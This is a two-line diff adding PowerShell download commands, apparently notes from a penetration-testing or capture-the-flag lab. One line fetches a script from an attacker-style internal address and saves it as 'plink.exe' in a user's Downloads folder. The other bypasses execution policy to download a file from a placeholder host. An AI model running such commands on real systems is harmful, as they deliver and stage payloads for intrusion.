@@ -1,0 +1,2 @@
+powershell -c iwr http://10.10.14.115/39719.ps1 -outf \users\shaun\Downloads\plink.exe
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command '(New-Object System.Net.WebClient).DownloadFile("https://www.contoso.com/file","C:\path\file")'
